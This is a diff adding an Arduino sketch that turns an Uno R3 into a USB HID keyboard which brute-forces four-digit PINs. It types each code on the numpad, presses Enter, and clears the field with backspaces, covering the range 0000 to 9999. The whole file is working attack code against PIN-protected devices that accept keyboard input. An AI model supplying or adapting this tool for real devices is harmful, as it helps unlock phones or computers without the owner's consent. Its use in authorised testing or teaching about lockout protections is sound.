@@ -1,0 +1,185 @@
+/*0000-9999 pin bruteforce using Uno R3 as HID Keyboard
+*Andrew Beutler May 2017
+*See readme for info on configuring an Arduino Uno as an HID device
+*/
+
+uint8_t buf[8] = { 0 }; //Keyboard report buffer
+
+void setup()
+{
+	Serial.begin(9600);
+	delay(200);
+}
+
+int num1 = 0;
+int num2 = 0;
+int num3 = 0;
+int num4 = 0;
+void loop()
+{
+	if(num1 < 9)
+	{
+	num1++;
+	}
+	else
+	{
+		num1 = 0;
+		if(num2 < 9)
+		{
+			num2++;
+		}
+		else
+		{
+			num2 = 0;
+			if(num3 < 9)
+			{
+				num3++;
+			}
+			else
+			{
+				num3 = 0;
+				if (num4 < 9)
+				{
+					num4++;
+				}
+				else
+				{
+				num1 = 0;
+				num2 = 0;
+				num3 = 0;
+				num4 = 0;
+				}
+			}
+		}
+	}
+	keyPressNum(num4);
+	releaseKey();
+	keyPressNum(num3);
+	releaseKey();
+	keyPressNum(num2);
+	releaseKey();
+	keyPressNum(num1);
+	releaseKey();
+	keyPressEnter();
+	releaseKey();
+	keyPressBkspc();
+	releaseKey();
+	keyPressBkspc();
+	releaseKey();
+	keyPressBkspc();
+	releaseKey();
+	keyPressBkspc();
+	releaseKey();
+}
+
+//Function that converts a number generated from the 4 digit pin to a number "pressed" on the keypad 
+void keyPressNum(int number)
+{
+	number = number + 1;
+	switch(number)
+	{
+		case 1:
+		{
+			buf[0] = 0;
+			buf[2] = 0x62; //numpad0
+			Serial.write(buf, 8);
+		}
+			break;
+
+		case 2:
+		{
+			buf[0] = 0;
+			buf[2] = 0x59; //numpad1
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 3:
+		{
+			buf[0] = 0;
+			buf[2] = 0x5A; //numpad2
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 4:
+		{
+			buf[0] = 0;
+			buf[2] = 0x5B; //numpad3
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 5:
+		{
+			buf[0] = 0;
+			buf[2] = 0x5C; //numpad4
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 6:
+		{
+			buf[0] = 0;
+			buf[2] = 0x5D; //numpad5
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 7:
+		{
+			buf[0] = 0;
+			buf[2] = 0x5E; //numpad6
+			Serial.write(buf, 8);
+		}
+		break;
+	
+		case 8:
+		{
+			buf[0] = 0;
+			buf[2] = 0x5F; //numpad7
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 9:
+		{
+			buf[0] = 0;
+			buf[2] = 0x60; //numpad8
+			Serial.write(buf, 8);
+		}
+		break;
+
+		case 10:
+		{
+			buf[0] = 0;
+			buf[2] = 0x61; //numpad9
+			Serial.write(buf, 8);
+		}
+		break;
+	}
+}
+
+//Function that sends enter when called
+void keyPressEnter()
+{
+	buf[0] = 0;
+	buf[2] = 0x58; //Enter Key
+	Serial.write(buf, 8);
+}
+
+//Function that sends backspace when called
+void keyPressBkspc()
+{
+	buf[0] = 0;
+	buf[2] = 0x2A; //Backspace Key
+	Serial.write(buf, 8);
+}
+
+//Function that releases any key that has been "pressed"
+void releaseKey()
+{
+	buf[0] = 0;
+	buf[2] = 0;
+	Serial.write(buf, 8); //Release Key
+}
